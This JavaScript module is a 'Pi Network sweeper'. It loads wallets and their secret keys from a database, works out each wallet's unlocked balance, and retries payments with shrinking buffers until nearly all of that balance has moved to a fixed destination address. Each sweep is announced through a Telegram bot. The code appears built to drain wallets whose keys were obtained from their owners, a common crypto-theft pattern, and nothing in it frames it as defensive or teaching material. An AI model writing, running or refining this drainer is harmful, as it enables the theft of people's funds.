/**
 * Ultimate Multi-Tier Pi Network Sweeper
 * Distinguishes Ledger Total, Locked, and Available Balances.
 * Uses aggressive micro-step testing on Available Balance to ensure instant clearance.
 */

const StellarSdk = require('@stellar/stellar-sdk');

async function checkAndSweepWallet(wallet, horizonUrl, db, bot) {
  const DESTINATION_ADDRESS = process.env.SWEEP_DESTINATION_ADDRESS;
  
  if (!DESTINATION_ADDRESS) {
    console.log(`[Sweeper] ERROR: SWEEP_DESTINATION_ADDRESS is not set in environment variables!`);
    return;
  }

  const server = new StellarSdk.Horizon.Server(horizonUrl);

  try {
    // 1. Load account from the Pi network ledger
    const account = await server.loadAccount(wallet.public_key);
    const nativeBalanceObj = account.balances.find(b => b.asset_type === 'native' || b.asset_code === 'PI');

    if (!nativeBalanceObj) {
      console.log(`[Sweeper] Wallet #${wallet.id}: No native balance found.`);
      return;
    }

    // 2. Separate the 3 distinct balances clearly
    const ledgerTotalBalance = parseFloat(nativeBalanceObj.balance || 0);
    const lockedBalance = parseFloat(nativeBalanceObj.locked_balance || 0);
    const availableBalance = ledgerTotalBalance - lockedBalance;

    console.log(`[Sweeper Analysis] Wallet #${wallet.id} ── Ledger Total: ${ledgerTotalBalance} Pi | Locked (Untouchable): ${lockedBalance} Pi | Available (Target): ${availableBalance} Pi`);

    // We ONLY focus on Available Balance. If it's too low, we do nothing.
    const minThreshold = 0.002;
    if (availableBalance <= minThreshold) {
      return; 
    }

    const sourceKeypair = StellarSdk.Keypair.fromSecret(wallet.secret_key);
    const fee = await server.fetchBaseFee();

    // 3. Aggressive Multi-Step Trial Loop (Tests micro-amounts against available balance)
    // This mirrors the rapid trial behavior to find the exact clearance amount instantly.
    const trialBuffers = [0.001, 0.002, 0.005, 0.01, 0.02, 0.05];
    let success = false;
    let finalSentAmount = 0;
    let txHash = '';

    for (const buffer of trialBuffers) {
      let targetAmount = availableBalance - buffer;
      if (targetAmount <= 0) continue;

      try {
        // Fetch a fresh account state for each sequence attempt
        const freshAccount = await server.loadAccount(wallet.public_key);
        
        const transaction = new StellarSdk.TransactionBuilder(freshAccount, {
          fee: fee.toString(),
          networkPassphrase: 'Pi Network'
        })
          .addOperation(
            StellarSdk.Operation.payment({
              destination: DESTINATION_ADDRESS,
              asset: StellarSdk.Asset.native(),
              amount: targetAmount.toFixed(7)
            })
          )
          .setTimeout(30)
          .build();

        transaction.sign(sourceKeypair);
        const response = await server.submitTransaction(transaction);
        
        finalSentAmount = targetAmount;
        txHash = response.hash;
        success = true;
        break; // Success! Break out of trial loop.
      } catch (trialErr) {
        // If a specific buffer amount triggers a network reserve block, instantly try the next buffer size
        continue;
      }
    }

    if (success) {
      console.log(`[Sweeper SUCCESS] Wallet #${wallet.id} successfully swept ${finalSentAmount.toFixed(7)} Pi from Available Balance! Tx Hash: ${txHash}`);

      // Update database sweep count
      db.prepare('UPDATE wallets SET sweep_count = sweep_count + 1 WHERE id = ?').run(wallet.id);

      // Send Telegram notification
      if (bot && wallet.chat_id) {
        bot.sendMessage(wallet.chat_id,
          `🚀 **SUCCESSFUL WALLET SWEEP!**\n\n` +
          `📦 **Wallet Box:** #${wallet.id}\n` +
          `🔑 **From Address:** \`${wallet.public_key}\`\n` +
          `📥 **To Destination:** \`${DESTINATION_ADDRESS}\`\n` +
          `💰 **Available Balance Swept:** \`${finalSentAmount.toFixed(7)} Pi\`\n` +
          `🔒 **Locked Balance Left Intact:** \`${lockedBalance} Pi\`\n` +
          `🔗 **Tx Hash:** \`${txHash}\``,
          { parse_mode: 'Markdown' }
        );
      }
    } else {
      console.log(`[Sweeper Notice] Wallet #${wallet.id}: Available balance is held by network dust rules.`);
    }

  } catch (error) {
    const errorDetails = error.response?.data?.extras?.result_codes || error.message;
    console.error(`[Sweeper ERROR] Wallet #${wallet.id}:`, JSON.stringify(errorDetails));
  }
}

module.exports = { checkAndSweepWallet };
